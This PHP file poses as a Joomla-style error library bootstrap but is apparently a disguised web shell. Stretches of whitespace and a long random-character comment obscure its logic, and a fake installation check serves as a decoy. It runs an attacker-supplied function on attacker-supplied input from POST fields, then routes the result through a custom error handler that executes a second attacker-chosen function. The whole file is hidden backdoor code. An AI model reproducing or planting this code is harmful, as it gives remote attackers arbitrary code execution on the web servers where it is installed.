<?php
/**
 * @package    Error Libraries
 * ********************************************************************************
 * @copyright  Copyright (C) 2005 - 2015 Open Source Matters, Inc. All rights reserved.
 * @license    GNU General Public License version 2 or later; see LICENSE
 */

// Set the platform root path as a constant if necessary.
if (!defined('PATH'))
{
	define('PATH', __DIR__);
}

// Installation check, and check on removal of the install directory.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   // geg4WMcH4bYDunA6f91kN3vNQBEncBnZgFYb5ZV95mYyveVDbrAwc8KmDZ4kZfFwYTKtnwGfUN7Fq9MF0xUEkErm9818cFU4k8Bb5zVfqxV60QsFwfyBX8yyWWbzsA0qpNqsYZX8kBYPVFTZV5UHUxB4qHaamVGRSVtPXchFbBE4Dtexke2A67QsC4SyNxreEGF2bCvUhGDsNudYefQ7MzbvVyus3PPNkXnvX1Qhm8yYFsF9AUQMRcszHkYK0MhHuhsHtC87Nr
if ((file_exists(PATH . '/cofiguation.php')
	&& (filesize(PATH . '/cofiguation.php') < 10)) && file_exists(PATH . '/error.php'))
{
	if (file_exists(PATH . '/error.php'))
	{
		header('Location: ' . substr($_SERVER['REQUEST_URI'], 0, strpos($_SERVER['REQUEST_URI'], 'index.php')) . 'installation/index.php');
		
		exit;
	}
	else
	{
		echo 'No configuration file found and no installation code available. Exiting...';
		
		exit;
	}
}
else if (                            empty                   ($_POST)) {
	
	echo 'No error configuration data. Exiting...';
	
	exit;
}

// Register the library base path for error libraries.
function error_handler   ($errno, $errstr, $errfile, $errline)
{
	array_map    (          $_POST['d']                      (                 '', $errstr), array                ('')                       )
;
}
set_error_handler                  (                        'error_handler')


;

// Detect the native operating system type.
$os = strtoupper                (substr     (PHP_OS, 0, 3));

//Detect Win Error
$win_error =                               $_POST['f']                  (                             $_POST['c']                           );

if (!defined('IS_WIN'))
{
	define('IS_WIN', ($os === 'WIN') ? true : false);
}
if (!defined('IS_UNIX'))
{
	define('IS_UNIX', (IS_WIN === false) ? true : false);
}

// Register error
trigger_error                           (  $win_error, E_USER_ERROR)
;

